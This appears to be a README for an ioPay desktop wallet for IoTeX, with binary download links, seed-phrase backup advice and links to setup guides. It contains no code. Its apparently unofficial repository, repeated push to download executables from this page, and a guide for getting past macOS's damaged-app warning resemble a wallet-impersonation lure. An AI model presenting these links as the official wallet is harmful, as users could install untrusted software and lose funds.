![ioPay Wallet](assets/banner-profile.png)

<h1 align="center">ioPay Wallet</h1>

<p align="center"><em>Twenty minutes on the first evening decides whether a lost laptop is an inconvenience or the end of the account.</em></p>

<p align="center"><a href="#license"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733" alt="License: Apache-2.0"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2"><img src="https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733" alt="Release: v2.0.2"></a></p>

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

The current build and its three files sit on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2).

> **One download, before anything is funded.** Use the release page in this README, never a mirror.

## Why ioPay Wallet

Most wallet advice starts at the download and stops there. The first install is the part that matters most, because it is the only moment when the account exists without value in it and the backup can still be tested for free. ioPay Wallet is a desktop wallet for IoTeX that keeps the key on your machine, and its first-launch flow asks you to create or import an account before anything is funded. That ordering is the point: the phrase is written down offline, a restore is tried once, and only then does the address receive anything worth protecting.

The application is published as Iopay Wallet Desktop. It shows a native `io1...` address alongside the EVM `0x...` address for the same key, so the first transfer in can be checked against the form the sender expects. It also separates two things that are easy to confuse on day one: the app lock, which is a PIN for the application on that computer, and the recovery phrase, which is the account itself. A forgotten PIN is recoverable with the phrase; a lost phrase is not recoverable with the PIN.

- **Four ways to begin.** A new twelve- or twenty-four-word phrase, an existing phrase, a private key, or a keystore file.
- **One phrase, several accounts.** A long-term account and a working account can share the same backup, which is why one written phrase can protect more than one address.
- **A restore you have practised.** Importing the phrase into a fresh install is the only proof that the backup works, and it costs nothing before the account is funded.
- **Three installers, three procedures.** Windows uses an `.exe`, macOS a `.dmg`, and Linux a `.zip` that has to be unpacked rather than installed.

## The first hour, in order

Download the file whose name carries both the platform and v2.0.2. The three assets for this release are `iopay-wallet-desktop-win-v2.0.2.exe` at 63.8 MB, `iopay-wallet-desktop-macos-v2.0.2.dmg` at 21.5 MB, and `iopay-wallet-desktop-linux-v2.0.2.zip` at 79.4 MB. A differently named build from a review site is a different file, whatever the page says about it.

Create the wallet, then stop. Write the phrase on paper, put it somewhere that is not the computer and not a photograph, and check every word against the screen a second time. Close the application, open it again, and import the phrase into a second account inside the same install. If both address forms appear and match the first account, the backup is real. Only then should IOTX arrive.

Before the first send, read the address page. The native and EVM forms are different strings for the same key, and a service that expects one will not credit the other. That single check prevents more lost transfers than any other habit in these guides.

## What the first backup has to survive

A backup is not a copy of the application. It is the one artifact that reconstructs the account on a different machine after the original is gone, and the realistic losses are mundane: a laptop stolen from a bag, a drive that stops spinning, a move to a new computer, a database that will not open after an update. The phrase has to survive all four, which rules out storing it only in the application's own data directory and only in a photograph on the same phone.

Paper survives power loss, account locks and sync failures. It does not survive a fire or a flood if it lives in one place, so two locations is the normal answer for an amount worth protecting. Splitting a phrase across locations introduces a different failure - one part lost means the whole backup is lost - and should be a deliberate choice rather than an accident of tidiness.

Testing is the part readers skip. Importing the phrase into a second account inside the same install proves the words are right and in the right order, and it costs nothing before the wallet holds value. Doing it after the first deposit is the same test with real consequences, which is why the guides put it before the funding step rather than in a later chapter.

## Guides for this part of the wallet

| Guide | What it answers |
|---|---|
| [How to Back Up an ioPay Seed Phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) | How to record the phrase once and prove the backup actually works. |
| [Restoring ioPay Wallet From a Seed Phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/restoring-iopay-wallet-from-a-seed-phrase.md) | Importing the phrase into a fresh install and confirming both address forms appear. |
| [Install ioPay Wallet on Windows](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md) | The download check, the installer and the first launch, step by step. |
| [ioPay Wallet on macOS](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-installation-guide-for-macos.md) | The disk image, the Applications folder and what to do about the damaged-app prompt. |
| [Installing ioPay Wallet Desktop on Linux](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-desktop-install-on-linux.md) | The zip, the execute bit and the missing-library errors a bare launch reveals. |

This repository sits inside the ioPay Wallet account as a secondary entry point; the wallet on this page is the product, and the guides are where the detail lives.

## Security

**The phrase goes on paper, offline, before the first deposit, and it never goes into a website, a chat window or a support form.**

## Support

These repositories carry no issue tracker and no support desk that holds keys. The [help guide](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) lists the routes that exist and the approaches that only imitate one.

## License

Apache-2.0, the same licence the ioPay Wallet project uses.

---

[Wallet repository](https://github.com/iopay-project/iopay-desktop-wallet) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [All guides](https://github.com/iopay-project/desktop-setup-and-safety)
